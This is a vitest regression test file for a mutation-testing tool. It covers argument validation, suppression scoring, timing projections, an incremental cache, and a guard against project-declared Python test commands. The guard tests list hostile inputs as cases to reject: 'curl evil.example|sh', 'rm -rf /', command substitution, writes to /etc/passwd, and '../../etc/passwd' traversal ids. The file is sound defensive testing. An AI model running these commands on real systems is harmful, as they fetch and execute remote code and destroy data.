/**
 * Regression coverage for the remaining findings of the comprehensive audit.
 *
 * Each block states the defect it pins, because a test that only asserts the
 * current behaviour cannot tell a future reader which way the behaviour was
 * wrong — and every one of these was a silent wrong answer rather than a crash.
 */
import { describe, it, expect, afterEach } from 'vitest';
import {
  mkdtempSync,
  mkdirSync,
  writeFileSync,
  readFileSync,
  readdirSync,
  rmSync,
  existsSync,
  statSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { readFileSync as readPkg } from 'node:fs';

import { validateToolArgs } from '../handler.js';
import { applySuppressions } from '../audit/apply-suppressions.js';
import { hasNoMutableLogic } from '../core/score-semantics.js';
import { isNoCoverage } from '../utils/no-coverage.js';
import { projectTimingRange } from '../core/baseline-timing.js';
import { isRepoTestCommandAllowed, resolveTestCommand } from '../engines/python.js';
import {
  INCREMENTAL_FILE_NAME,
  incrementalCacheDir,
  incrementalCachePath,
  harvestIncrementalFile,
  seedIncrementalFile,
} from '../utils/incremental-cache.js';
import { MIN_NODE_VERSION } from '../cli.js';
import type { MutationResult } from '../engines/base.js';

const temps: string[] = [];
function tempDir(prefix: string): string {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  temps.push(dir);
  return dir;
}
afterEach(() => {
  while (temps.length > 0) {
    const dir = temps.pop();
    if (dir === undefined) continue;
    try {
      rmSync(dir, { recursive: true, force: true });
    } catch {
      /* best-effort */
    }
  }
});

// ── timeoutMs validation ─────────────────────────────────────────────────────
/**
 * `timeoutMs` was the only tool argument with no validator. The resolver
 * accepts `number > 0` and silently falls back to the 5-minute default for
 * anything else — so a caller who passed `-1` or `"60000"` believed the run was
 * capped when it was not.
 */
describe('validateToolArgs — timeoutMs', () => {
  const message = (args: Record<string, unknown>): string =>
    (validateToolArgs(args)?.content[0] as { text: string } | undefined)?.text ?? '';

  it('rejects a negative timeout instead of ignoring it', () => {
    expect(message({ timeoutMs: -1 })).toContain('timeoutMs must be a positive number');
  });

  it('rejects zero', () => {
    expect(message({ timeoutMs: 0 })).toContain('timeoutMs must be a positive number');
  });

  it('rejects NaN, which is a number but not a usable budget', () => {
    expect(message({ timeoutMs: Number.NaN })).toContain('timeoutMs must be a positive number');
  });

  it('rejects a numeric string', () => {
    expect(message({ timeoutMs: '60000' })).toContain('timeoutMs must be a positive number');
  });

  it('accepts a positive timeout', () => {
    expect(validateToolArgs({ timeoutMs: 60_000 })).toBeNull();
  });

  it('accepts an absent timeout', () => {
    expect(validateToolArgs({})).toBeNull();
  });
});

// ── runId shape ──────────────────────────────────────────────────────────────
describe('validateToolArgs — runId shape', () => {
  const message = (args: Record<string, unknown>): string =>
    (validateToolArgs(args)?.content[0] as { text: string } | undefined)?.text ?? '';

  it('rejects a traversal-shaped id before it can reach the cache', () => {
    expect(message({ runId: '../../etc/passwd' })).toContain('8-character lowercase hex');
  });

  it('rejects an id with a path separator', () => {
    expect(message({ runId: 'aa/bb' })).toContain('8-character lowercase hex');
  });

  it('accepts the shape saveRun actually mints', () => {
    expect(validateToolArgs({ runId: 'a1b2c3d4' })).toBeNull();
  });

  it('still reports mutual exclusion first — the more actionable error', () => {
    // Complaining about the id's shape when the caller passed two scoping
    // arguments would send them off fixing the wrong one.
    expect(message({ runId: 'bad-id', diffBase: 'HEAD' })).toContain('mutually exclusive');
  });
});

// ── fully-suppressed files ───────────────────────────────────────────────────
/**
 * Suppressing every mutant left `totalMutants: 0` with no scope note, which is
 * exactly the signature of "this file has no mutable logic" — so the report
 * said mutation testing was not meaningful here, the opposite of the truth, and
 * the file ranked as a genuine 100%.
 */
describe('applySuppressions — every mutant suppressed', () => {
  const result: MutationResult = {
    target: 'src/a.ts',
    totalMutants: 2,
    killed: 0,
    survived: 2,
    mutationScore: '0.00%',
    vulnerabilities: [
      { line: 1, mutator: 'Cond', kind: 'survived', description: 'survived' },
      { line: 2, mutator: 'Arith', kind: 'survived', description: 'survived' },
    ],
  };
  const suppressed = new Set(['1 Cond', '2 Arith']);

  it('does not masquerade as a file with no mutable logic', () => {
    const { result: out } = applySuppressions(result, suppressed);
    expect(out.totalMutants).toBe(0);
    expect(hasNoMutableLogic(out)).toBe(false);
  });

  it('explains that everything was suppressed', () => {
    const { result: out } = applySuppressions(result, suppressed);
    expect(out.scopeNote).toContain('suppressed as equivalent');
    expect(out.scopeNote).toContain('2 mutant(s)');
  });

  it('leaves an existing scope note alone', () => {
    const scoped = { ...result, scopeNote: 'No changed lines.' };
    expect(applySuppressions(scoped, suppressed).result.scopeNote).toBe('No changed lines.');
  });

  it('adds no scope note when mutants remain', () => {
    const { result: out } = applySuppressions(result, new Set(['1 Cond']));
    expect(out.totalMutants).toBe(1);
    expect(out.scopeNote).toBeUndefined();
  });
});

// ── structured survivor/no-coverage classification ───────────────────────────
/**
 * The split was recovered by regex-matching the human-readable description for
 * "no test reached", so rewording one sentence in the TypeScript engine would
 * silently reclassify every no-coverage mutant as a survivor — changing scores,
 * severity ranking, and suppression arithmetic with no test failure.
 */
describe('isNoCoverage', () => {
  it('trusts the structured kind over the prose', () => {
    expect(isNoCoverage({ kind: 'noCoverage', description: 'anything at all' })).toBe(true);
    expect(isNoCoverage({ kind: 'survived', description: 'no test reached this line' })).toBe(
      false,
    );
  });

  it('falls back to the description when no kind is present', () => {
    expect(isNoCoverage({ description: 'No test reached this line (NoCoverage).' })).toBe(true);
    expect(isNoCoverage({ description: 'Logical mutation survived.' })).toBe(false);
  });
});

// ── timing projection ────────────────────────────────────────────────────────
/**
 * `fitsBudget` and the caller's audit/scope-down/skip decision rest on this
 * range, so pin the invariants it must satisfy rather than the tuning constants
 * themselves — the constants should be re-tunable against real runs without
 * rewriting the tests.
 */
describe('projectTimingRange invariants', () => {
  const cases: [number, number, number, boolean][] = [
    [0, 0, 1, false],
    [1, 10, 1, false],
    [500, 250, 4, true],
    [10_000, 1_000, 8, false],
  ];

  it('always returns optimistic <= estimated <= upperBound', () => {
    for (const [mutants, baseline, workers, cmd] of cases) {
      const p = projectTimingRange(mutants, baseline, workers, cmd);
      expect(p.optimisticMs).toBeLessThanOrEqual(p.estimatedMs);
      expect(p.estimatedMs).toBeLessThanOrEqual(p.upperBoundMs);
    }
  });

  it('never projects a negative duration', () => {
    for (const [mutants, baseline, workers, cmd] of cases) {
      const p = projectTimingRange(mutants, baseline, workers, cmd);
      expect(p.optimisticMs).toBeGreaterThanOrEqual(0);
    }
  });

  it('is monotonic in the mutant count', () => {
    const few = projectTimingRange(10, 100, 2, false);
    const many = projectTimingRange(100, 100, 2, false);
    expect(many.estimatedMs).toBeGreaterThan(few.estimatedMs);
  });

  it('projects the command runner as slower and less certain than a native one', () => {
    const native = projectTimingRange(100, 100, 2, false);
    const command = projectTimingRange(100, 100, 2, true);
    expect(command.estimatedMs).toBeGreaterThan(native.estimatedMs);
    expect(command.confidence).toBe('low');
    expect(native.confidence).toBe('medium');
  });

  it('more workers never makes the projection longer', () => {
    const one = projectTimingRange(100, 100, 1, false);
    const four = projectTimingRange(100, 100, 4, false);
    expect(four.estimatedMs).toBeLessThanOrEqual(one.estimatedMs);
  });
});

// ── repo-declared Python test command ────────────────────────────────────────
/**
 * cosmic-ray word-splits `test-command` with `shlex.split` and runs it as argv
 * — no shell — once per mutant, and one source of that string is the AUDITED
 * project's own `pyproject.toml [tool.mutmut] runner` key. Running the
 * project's test suite is in scope for mutation testing; letting repo content
 * choose an arbitrary first token to execute, with arbitrary further words as
 * its arguments, is the same hazard `prebuildCommand` is gated behind
 * `allowPrebuild` for.
 */
describe('repo-declared Python test command', () => {
  const originalFlag = process.env.CHAOS_MCP_ALLOW_REPO_TEST_COMMAND;
  afterEach(() => {
    if (originalFlag === undefined)
      Reflect.deleteProperty(process.env, 'CHAOS_MCP_ALLOW_REPO_TEST_COMMAND');
    else process.env.CHAOS_MCP_ALLOW_REPO_TEST_COMMAND = originalFlag;
  });

  it('accepts a bare executable name — the shape the key is meant to hold', () => {
    for (const runner of ['nose2', 'ward', 'green', 'py.test-3.11', 'my_runner']) {
      expect(isRepoTestCommandAllowed(runner)).toBe(true);
    }
  });

  it('refuses anything carrying shell syntax or arguments', () => {
    for (const runner of [
      'sh -c "curl evil.example|sh"',
      'pytest; rm -rf /',
      'echo $(whoami)',
      'runner && other',
      'runner > /etc/passwd',
      'python -m unittest discover',
    ]) {
      expect(isRepoTestCommandAllowed(runner)).toBe(false);
    }
  });

  it('throws rather than silently substituting pytest', () => {
    // Silently running a different suite would quietly change what "survived"
    // means, which is worse than refusing.
    expect(() => resolveTestCommand('python3', { testRunner: 'sh -c "curl evil"' })).toThrow(
      /Refusing to run the test command/,
    );
  });

  it('names both opt-in routes in the error', () => {
    // Both, because they are for different people: the config key is the
    // operator's considered choice, the env var is the escape hatch.
    expect(() => resolveTestCommand('python3', { testRunner: 'sh -c "x"' })).toThrow(/cosmicray/);
    expect(() => resolveTestCommand('python3', { testRunner: 'sh -c "x"' })).toThrow(
      /CHAOS_MCP_ALLOW_REPO_TEST_COMMAND/,
    );
  });

  it('spells out WHY the command was refused and what is accepted', () => {
    // The refusal is a security decision the operator has to be able to act on:
    // where the command came from, that cosmic-ray executes it once per
    // mutant, and that only a bare executable name is taken from project files.
    const message = (() => {
      try {
        resolveTestCommand('python3', { testRunner: 'sh -c "x"' });
        return '';
      } catch (e) {
        return (e as Error).message;
      }
    })();

    expect(message).toContain('pyproject.toml [tool.mutmut] runner');
    expect(message).toContain('cosmic-ray executes it once per mutant');
    expect(message).toContain('only a bare executable name is accepted from project files');
    expect(message).toContain('commands in this workspace.');
  });

  it('trusts the same string when it came from the operator config', () => {
    expect(
      resolveTestCommand('python3', {
        testRunner: 'python -m unittest discover',
        testRunnerTrusted: true,
      }),
    ).toBe('python -m unittest discover');
  });

  it('honours the environment opt-in', () => {
    process.env.CHAOS_MCP_ALLOW_REPO_TEST_COMMAND = '1';
    expect(resolveTestCommand('python3', { testRunner: 'nose2 -v' })).toBe('nose2 -v');
  });

  it('accepts "true" as well as "1" for the environment opt-in', () => {
    // Both spellings are documented; only "1" was ever exercised, so the
    // second comparison could be dropped without a test noticing.
    process.env.CHAOS_MCP_ALLOW_REPO_TEST_COMMAND = 'true';
    expect(resolveTestCommand('python3', { testRunner: 'nose2 -v' })).toBe('nose2 -v');
    expect(isRepoTestCommandAllowed('sh -c "x"')).toBe(true);
  });

  it('rejects any other value for the environment opt-in', () => {
    // Truthiness is not enough: "0", "yes" and "" must all leave the guard shut,
    // or a stray export silently trusts project-declared shell commands.
    for (const value of ['0', 'yes', 'TRUE', '']) {
      process.env.CHAOS_MCP_ALLOW_REPO_TEST_COMMAND = value;
      expect(isRepoTestCommandAllowed('sh -c "x"')).toBe(false);
    }
  });

  it('appends a python test selection to whichever base command was chosen', () => {
    // The selection scopes cosmic-ray to the target module's own tests. Joined
    // without a separator it becomes one unrunnable path argument.
    expect(
      resolveTestCommand('python3', {
        pythonTestSelection: ['tests/test_a.py', 'tests/test_b.py'],
      }),
    ).toBe('python3 -m pytest -x -q tests/test_a.py tests/test_b.py');
    expect(
      resolveTestCommand('python3', {
        testRunner: 'unittest',
        pythonTestSelection: ['tests/test_a.py'],
      }),
    ).toBe('python3 -m unittest tests/test_a.py');
  });

  it('leaves the command untouched for an empty selection list', () => {
    // `selection.length > 0` — an empty array is truthy, so only the length
    // check stops a trailing space being appended to the command.
    expect(resolveTestCommand('python3', { pythonTestSelection: [] })).toBe(
      'python3 -m pytest -x -q',
    );
  });

  it('gates a pytest-FLAVOURED project command instead of substituting bare pytest', () => {
    // UPDATED. This test previously asserted the opposite — that
    // `python -m pytest` resolved to `python3 -m pytest -x -q` — and named the
    // `!runner.includes('pytest')` clause as deliberate. It was not: that clause
    // was the bug. Any pytest-flavoured project command failed it, skipped the
    // gate branch, fell through to the default, and had the project's declared
    // command silently DISCARDED. `[tool.mutmut] runner = "python -m pytest
    // --no-cov -p no:randomly"` — a project that switched those plugins off
    // because its tests are order-dependent and its coverage plugin conflicts —
    // then ran WITH them under every per-mutant invocation, so mutants were
    // scored killed by failures unrelated to the mutation. Neither the throw nor
    // a warning fired, and the resulting score was wrong in both directions.
    //
    // The command is project-declared and carries arguments, so it now takes the
    // documented route: refuse, and name the two opt-ins.
    expect(() => resolveTestCommand('python3', { testRunner: 'python -m pytest' })).toThrow(
      /Refusing to run the test command "python -m pytest"/,
    );
    // The operator's own config is still honoured verbatim — the gate only
    // applies to strings scanned out of the audited workspace.
    expect(
      resolveTestCommand('python3', {
        testRunner: 'python -m pytest --no-cov -p no:randomly',
        testRunnerTrusted: true,
      }),
    ).toBe('python -m pytest --no-cov -p no:randomly');
    // The bare `pytest` sentinel is a detection RESULT, not a project command,
    // so it keeps taking the interpreter-prefixed default path.
    expect(resolveTestCommand('python3', { testRunner: 'pytest' })).toBe('python3 -m pytest -x -q');
  });

  it('leaves the ordinary pytest and unittest paths untouched', () => {
    expect(resolveTestCommand('python3', { testRunner: 'pytest' })).toBe('python3 -m pytest -x -q');
    expect(resolveTestCommand('python3', { testRunner: 'unittest' })).toBe('python3 -m unittest');
    expect(resolveTestCommand('python3', undefined)).toBe('python3 -m pytest -x -q');
  });
});

// ── incremental cache ────────────────────────────────────────────────────────
/**
 * `incremental` promised to reuse a previous run's results, but Stryker wrote
 * its incremental file into a sandbox that is deleted on the way out — so every
 * run started from nothing and the option was a permanent no-op that still cost
 * the caller Stryker's incremental bookkeeping.
 */
describe('incremental cache', () => {
  it('keys by workspace AND target, so same-named files never collide', () => {
    const a = incrementalCachePath('/ws', 'packages/a/src/index.ts');
    const b = incrementalCachePath('/ws', 'packages/b/src/index.ts');
    const c = incrementalCachePath('/other-ws', 'packages/a/src/index.ts');
    expect(a).not.toBe(b);
    expect(a).not.toBe(c);
  });

  it('is stable for the same inputs', () => {
    expect(incrementalCachePath('/ws', 'src/a.ts')).toBe(incrementalCachePath('/ws', 'src/a.ts'));
  });

  it('names the entry as a hex digest, so it is filesystem-safe everywhere', () => {
    // The whole reason the key is hashed is that the name must be safe on every
    // platform and unable to escape the cache directory. A digest returned as
    // raw bytes instead of hex stringifies to arbitrary characters — including
    // separators — which is exactly the failure the hash is there to prevent.
    const name = incrementalCachePath('/ws', 'src/a.ts', '/cache').slice('/cache/'.length);
    expect(name).toMatch(/^[0-9a-f]{64}\.json$/);
  });

  it('produces a filesystem-safe name that cannot escape the cache dir', () => {
    const p = incrementalCachePath('/ws', '../../etc/passwd', '/cache');
    expect(p.startsWith('/cache/')).toBe(true);
    expect(p).not.toContain('..');
  });

  it('round-trips state from one sandbox to the next', () => {
    const cacheDir = tempDir('chaos-inc-cache-');
    const first = tempDir('chaos-sandbox-a-');
    const second = tempDir('chaos-sandbox-b-');
    const cachePath = join(cacheDir, 'entry.json');

    // Run 1 produces incremental state, which is harvested before teardown.
    writeFileSync(join(first, INCREMENTAL_FILE_NAME), '{"schemaVersion":"1"}', 'utf8');
    harvestIncrementalFile(cachePath, first);
    expect(existsSync(cachePath)).toBe(true);

    // Run 2 gets a fresh sandbox and is seeded from the cache.
    seedIncrementalFile(cachePath, second);
    expect(readFileSync(join(second, INCREMENTAL_FILE_NAME), 'utf8')).toBe('{"schemaVersion":"1"}');
  });

  it('treats a cache miss as a full run rather than an error', () => {
    const sandbox = tempDir('chaos-sandbox-');
    expect(() => seedIncrementalFile('/nonexistent/cache.json', sandbox)).not.toThrow();
    expect(existsSync(join(sandbox, INCREMENTAL_FILE_NAME))).toBe(false);
  });

  it('never fails a completed audit just because the cache could not be written', () => {
    const sandbox = tempDir('chaos-sandbox-');
    writeFileSync(join(sandbox, INCREMENTAL_FILE_NAME), '{}', 'utf8');
    // Destination whose PARENT is a regular file, so mkdir fails with ENOTDIR.
    // (Deliberately not a /proc path: mkdir under procfs blocks rather than
    // erroring on some kernels, which would hang the suite instead of testing
    // it. The real cache always lives under tmpdir(), so this is the realistic
    // failure shape anyway — a stale file where a directory should be.)
    const blocker = tempDir('chaos-blocker-');
    const filePath = join(blocker, 'not-a-dir');
    writeFileSync(filePath, 'x', 'utf8');
    // An unwritable destination costs time next run, nothing more.
    expect(() => harvestIncrementalFile(join(filePath, 'cache.json'), sandbox)).not.toThrow();
  });

  it('harvests nothing when the run produced nothing', () => {
    const cacheDir = tempDir('chaos-inc-cache-');
    const sandbox = tempDir('chaos-sandbox-');
    const cachePath = join(cacheDir, 'entry.json');
    harvestIncrementalFile(cachePath, sandbox);
    expect(existsSync(cachePath)).toBe(false);
  });

  it('does not create the cache directory when the run produced nothing', () => {
    // The "nothing produced" guard has to come BEFORE the mkdir, not after: a
    // run that Stryker never wrote incremental state for must leave no trace on
    // the host. Asserting only that the cache FILE is absent cannot see a
    // dropped guard, because the copy then fails and is swallowed anyway.
    const parent = tempDir('chaos-inc-cache-');
    const sandbox = tempDir('chaos-sandbox-');
    const cacheDir = join(parent, 'nested', 'cache');

    harvestIncrementalFile(join(cacheDir, 'entry.json'), sandbox);

    expect(existsSync(cacheDir)).toBe(false);
  });

  it('leaves no temporary file behind after a successful harvest', () => {
    // The harvest writes through a `<cachePath>.<pid>.<uuid>.tmp` staging file
    // and renames it into place, so a crash mid-copy cannot leave a half-written
    // entry that the next run would seed from. The rename consumes the staging
    // file, and the belt-and-braces rmSync must not leave one behind either —
    // otherwise every audit leaks one into the cache directory.
    const cacheDir = tempDir('chaos-inc-cache-');
    const sandbox = tempDir('chaos-sandbox-');
    const cachePath = join(cacheDir, 'entry.json');
    writeFileSync(join(sandbox, INCREMENTAL_FILE_NAME), '{"schemaVersion":"1"}', 'utf8');

    harvestIncrementalFile(cachePath, sandbox);

    expect(existsSync(cachePath)).toBe(true);
    expect(readdirSync(cacheDir).filter((n) => n.endsWith('.tmp'))).toEqual([]);
  });

  it('replaces an existing entry atomically instead of writing through it', () => {
    // The publish step used to be a second copyFileSync, which opens the LIVE
    // cache file, truncates it and streams into it. A crash, SIGKILL or ENOSPC
    // part-way through leaves the torn file that seedIncrementalFile would hand
    // to Stryker on the next run. A rename swaps a new inode into place, so a
    // reader either sees the whole old entry or the whole new one — never a
    // prefix of either. Comparing inodes is how those two are told apart: an
    // in-place copy keeps the destination inode, a rename does not.
    const cacheDir = tempDir('chaos-inc-cache-');
    const sandbox = tempDir('chaos-sandbox-');
    const cachePath = join(cacheDir, 'entry.json');
    writeFileSync(cachePath, '{"schemaVersion":"0"}', 'utf8');
    const before = statSync(cachePath).ino;

    writeFileSync(join(sandbox, INCREMENTAL_FILE_NAME), '{"schemaVersion":"1"}', 'utf8');
    harvestIncrementalFile(cachePath, sandbox);

    expect(readFileSync(cachePath, 'utf8')).toBe('{"schemaVersion":"1"}');
    expect(statSync(cachePath).ino).not.toBe(before);
  });
});

describe('incrementalCacheDir', () => {
  it('defaults to a NAMED directory under tmpdir, not tmpdir itself', () => {
    // Blanking the directory name would put every cache entry loose in the
    // system temp directory, where nothing identifies it as ours and nothing
    // can clean it up as a group.
    expect(incrementalCacheDir()).toBe(join(tmpdir(), 'chaos-mcp-incremental'));
    expect(incrementalCacheDir()).not.toBe(tmpdir());
  });

  it('uses an explicitly supplied directory verbatim', () => {
    expect(incrementalCacheDir('/custom/cache')).toBe('/custom/cache');
  });

  it('anchors incrementalCachePath inside whichever directory applies', () => {
    expect(
      incrementalCachePath('/ws', 'src/a.ts', '/custom/cache').startsWith('/custom/cache/'),
    ).toBe(true);
    expect(incrementalCachePath('/ws', 'src/a.ts').startsWith(`${incrementalCacheDir()}/`)).toBe(
      true,
    );
  });
});

// ── version floor sync ───────────────────────────────────────────────────────
/**
 * The runtime check had drifted to Node 18 while package.json required >= 22,
 * so a Node 18 user passed the check and then failed obscurely later — instead
 * of seeing the clear upgrade message the check exists to print.
 */
describe('MIN_NODE_VERSION', () => {
  it('matches package.json engines.node', () => {
    const pkg = JSON.parse(readPkg(new URL('../../package.json', import.meta.url), 'utf8')) as {
      engines?: { node?: string };
    };
    const declared = pkg.engines?.node ?? '';
    expect(declared).toBe(`>=${MIN_NODE_VERSION}`);
  });
});

// ── directory used by the fixtures above ─────────────────────────────────────
describe('test fixtures', () => {
  it('creates and cleans its temp directories', () => {
    const dir = tempDir('chaos-fixture-');
    mkdirSync(join(dir, 'nested'), { recursive: true });
    expect(existsSync(join(dir, 'nested'))).toBe(true);
  });
});
